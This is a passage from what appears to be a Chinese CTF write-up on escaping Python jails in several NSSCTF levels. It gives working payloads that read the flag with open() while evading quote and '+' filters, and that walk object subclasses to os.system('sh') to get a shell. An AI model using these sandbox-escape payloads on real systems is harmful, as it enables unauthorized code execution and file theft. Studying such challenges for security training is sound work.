punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'AttributeError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'SyntaxError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'SyntaxError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'IndentationError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'IndentationError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'TabError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'TabError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'LookupError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'LookupError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'IndexError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'IndexError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'KeyError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'KeyError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'ValueError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'ValueError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'UnicodeError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'UnicodeError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'UnicodeEncodeError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'UnicodeEncodeError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'UnicodeDecodeError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'UnicodeDecodeError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'UnicodeTranslateError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'UnicodeTranslateError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'AssertionError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'AssertionError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'ArithmeticError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'ArithmeticError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'FloatingPointError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'FloatingPointError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'OverflowError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'OverflowError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'ZeroDivisionError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'ZeroDivisionError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'SystemError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'SystemError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'ReferenceError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'ReferenceError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'MemoryError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'MemoryError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'BufferError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'BufferError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'Warning'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'Warning'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'UserWarning'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'UserWarning'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'EncodingWarning'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'EncodingWarning'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'DeprecationWarning'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'DeprecationWarning'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'PendingDeprecationWarning'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'PendingDeprecationWarning'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'SyntaxWarning'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'SyntaxWarning'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'RuntimeWarning'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'RuntimeWarning'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'FutureWarning'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'FutureWarning'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'ImportWarning'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'ImportWarning'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'UnicodeWarning'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'UnicodeWarning'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'BytesWarning'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'BytesWarning'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'ResourceWarning'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'ResourceWarning'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'ConnectionError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'ConnectionError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'BlockingIOError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'BlockingIOError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'BrokenPipeError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'BrokenPipeError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'ChildProcessError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'ChildProcessError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'ConnectionAbortedError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'ConnectionAbortedError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'ConnectionRefusedError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'ConnectionRefusedError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'ConnectionResetError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'ConnectionResetError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'FileExistsError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'FileExistsError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'FileNotFoundError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'FileNotFoundError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'IsADirectoryError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'IsADirectoryError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'NotADirectoryError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'NotADirectoryError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'InterruptedError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'InterruptedError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'PermissionError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'PermissionError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'ProcessLookupError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'ProcessLookupError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'TimeoutError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'TimeoutError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'open'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">open</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'quit'</span><span class="token punctuation">:</span> Use quit<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">or</span> Ctrl<span class="token operator">-</span>D <span class="token punctuation">(</span>i<span class="token punctuation">.</span>e<span class="token punctuation">.</span> EOF<span class="token punctuation">)</span> to exit<span class="token punctuation">,</span> <span class="token string">'exit'</span><span class="token punctuation">:</span> Use exit<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">or</span> Ctrl<span class="token operator">-</span>D <span class="token punctuation">(</span>i<span class="token punctuation">.</span>e<span class="token punctuation">.</span> EOF<span class="token punctuation">)</span> to exit<span class="token punctuation">,</span> <span class="token string">'copyright'</span><span class="token punctuation">:</span> Copyright <span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token number">2001</span><span class="token operator">-</span><span class="token number">2022</span> Python Software Foundation<span class="token punctuation">.</span>
All Rights Reserved<span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>发现里面存在<code>open</code>函数，因为题目源码已经告诉我们flag的路径，那我们直接用<code>open(&#39;flag&#39;).read()</code>读取文件即可，但是需要用到引号</p>
<p>所以接下来就是要想办法获取引号</p>
<h3 id="bytes的ASCII-list初始化方式"><a href="#bytes的ASCII-list初始化方式" class="headerlink" title="bytes的ASCII list初始化方式"></a>bytes的ASCII list初始化方式</h3><p>我们可以使用 Python 中的 <code>bytes</code> 对象来表示一个字节序列，其中每个字节都是一个介于0和255之间的整数</p>
<p>例：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">72</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">87</span><span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">,</span> <span class="token number">114</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>结果是<code>b&#39;Hello World&#39;</code></p>
<p>而要想把字符串中的每个字符转换为ascii值，则需要运行以下脚本</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">s <span class="token operator">=</span> <span class="token string">"flag"</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> s<span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>结果是<code>[102, 108, 97, 103]</code></p>
<p>则最终的payload：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">102</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">103</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<hr>
<h2 id="level-4-0-5"><a href="#level-4-0-5" class="headerlink" title="level 4.0.5"></a><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/2992">level 4.0.5</a></h2><p>没给题目源码</p>
<p>先nc上题目看看</p>
<p>题目告诉我们和上题相比还多ban了<code>input</code>,<code>locals</code>,<code>globals</code></p>
<p>先尝试拿着上题的paylaod打进去看看</p>
<p>emm成功了</p>
<hr>
<h2 id="level-4-1"><a href="#level-4-1" class="headerlink" title="level 4.1"></a><a href="">level 4.1</a></h2><blockquote>
<p><code>__doc__</code>魔术方法获取字符+getshell</p>
</blockquote>
<p>没给题目源码</p>
<p>题目告诉我们比上题多ban了个<code>bytes</code>，那么这里还有一种方法能够获取字符</p>
<h3 id="doc-魔术方法获取字符"><a href="#doc-魔术方法获取字符" class="headerlink" title="__doc__魔术方法获取字符"></a><code>__doc__</code>魔术方法获取字符</h3><blockquote>
<p>用索引的方式得到想要的字符，并拼接在一起，得到我们想要的字符串</p>
</blockquote>
<p>以<code>().__doc__</code>为例，它的帮助文档为：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">Built<span class="token operator">-</span><span class="token keyword">in</span> immutable sequence<span class="token punctuation">.</span>\n\nIf no argument <span class="token keyword">is</span> given<span class="token punctuation">,</span> the constructor returns an empty <span class="token builtin">tuple</span><span class="token punctuation">.</span>\nIf iterable <span class="token keyword">is</span> specified the <span class="token builtin">tuple</span> <span class="token keyword">is</span> initialized <span class="token keyword">from</span> iterable's items<span class="token punctuation">.</span>\n\nIf the argument <span class="token keyword">is</span> a <span class="token builtin">tuple</span><span class="token punctuation">,</span> the <span class="token keyword">return</span> value <span class="token keyword">is</span> the same <span class="token builtin">object</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>所以我们只要在本地先找到对应的偏移量：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__doc__<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'f'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2023/06/07/python-jail/image-20230710174614003.png" alt="image-20230710174614003"></p>
<p>然后继续使用open函数读取文件，在payload中将其拼接即可</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__doc__<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__doc__<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__doc__<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__doc__<span class="token punctuation">[</span><span class="token number">38</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>然后发现flag好像不叫flag了。。。</p>
<p>那只能换个办法，直接getshell</p>
<h3 id="SSTI-getshell"><a href="#SSTI-getshell" class="headerlink" title="SSTI getshell"></a>SSTI getshell</h3><blockquote>
<p>Show subclasses with tuple，找到type类中的内部子类<code>&lt;class &#39;os._wrap_close&#39;&gt;</code>，它的全局变量和函数中存在<code>system</code></p>
</blockquote>
<p>对于这题，我们先查找<code>&lt;class &#39;os._wrap_close&#39;&gt;</code>的位置</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2023/06/07/python-jail/image-20230710181145995.png" alt="image-20230710181145995"></p>
<p>可以看到在倒数第四个</p>
<p>于是基础的payload形式为：（注：<code>__globals__</code>和<code>globals</code>不一样）</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'sh'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>接下来就是利用<code>__doc__</code>构造<code>[&#39;system&#39;](&#39;sh&#39;)</code></p>
<p><img src="/blog/2023/06/07/python-jail/image-20230710181406070.png" alt="image-20230710181406070"></p>
<p>最终payload：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__doc__<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__doc__<span class="token punctuation">[</span><span class="token number">86</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__doc__<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__doc__<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__doc__<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__doc__<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__doc__<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__doc__<span class="token punctuation">[</span><span class="token number">56</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2023/06/07/python-jail/image-20230710181548857.png" alt="image-20230710181548857"></p>
<p>其实这里也可以利用Show subclasses with tuple找到<code>bytes</code>类来构造拼接，在上面那张图可以看到<code>bytes</code>类的索引是6</p>
<hr>
<h2 id="level-4-2"><a href="#level-4-2" class="headerlink" title="level 4.2"></a><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/2997">level 4.2</a></h2><blockquote>
<p>字符串拼接过滤<code>+</code>的绕过 or 直接找到<code>bytes</code>类来构造拼接</p>
</blockquote>
<p>没给源码</p>
<p>题目信息告诉我们和上题相比多ban了个<code>+</code></p>
<p>上面刚提到的利用Show subclasses with tuple找到<code>bytes</code>类来构造拼接，拼接符是<code>.</code>，</p>
<p>所以可以构造对应的payload：（这题<code>&lt;class &#39;os._wrap_close&#39;&gt;</code>的索引和<code>bytes</code>类的索引都没变）</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">115</span><span class="token punctuation">,</span> <span class="token number">121</span><span class="token punctuation">,</span> <span class="token number">115</span><span class="token punctuation">,</span> <span class="token number">116</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">109</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">115</span><span class="token punctuation">,</span> <span class="token number">104</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>成功getshell</p>
<p><img src="/blog/2023/06/07/python-jail/image-20230710183006192.png" alt="image-20230710183006192"></p>
<h3 id="法2：join拼接"><a href="#法2：join拼接" class="headerlink" title="法2：join拼接"></a>法2：join拼接</h3><p>基础形式：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'4'</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">,</span> <span class="token string">'9'</span><span class="token punctuation">,</span> <span class="token string">'6'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>要绕过一开始的<code>&#39;&#39;</code>，这里直接用<code>str()</code>就行</p>
<p>payload：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__doc__<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__doc__<span class="token punctuation">[</span><span class="token number">86</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__doc__<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__doc__<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__doc__<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__doc__<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__doc__<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__doc__<span class="token punctuation">[</span><span class="token number">56</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<hr>
<h2 id="level-4-3"><a href="#level-4-3" class="headerlink" title="level 4.3"></a><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/3001">level 4.3</a></h2><p>没给源码</p>
<p>题目信息告诉我们这题多ban了<code>open</code>和<code>type</code>，也就是说上题的预期或许会用到这两个函数（？</p>
<p>不影响上题的payload一把梭</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">115</span><span class="token punctuation">,</span> <span class="token number">121</span><span class="token punctuation">,</span> <span class="token number">115</span><span class="token punctuation">,</span> <span class="token number">116</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">109</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">115</span><span class="token punctuation">,</span> <span class="token number">104</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2023/06/07/python-jail/image-20230710183550748.png" alt="image-20230710183550748"></p>
<hr>
<h2 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/2983">level 5</a></h2><p>没给源码</p>
<p>题目信息告诉我们flag好像在<code>dir()</code>中</p>
<p>那我们就看看</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">></span> <span class="token builtin">dir</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">,</span> <span class="token string">'my_flag'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>有一个<code>my_flag</code>方法</p>
<p>查看这个方法</p>
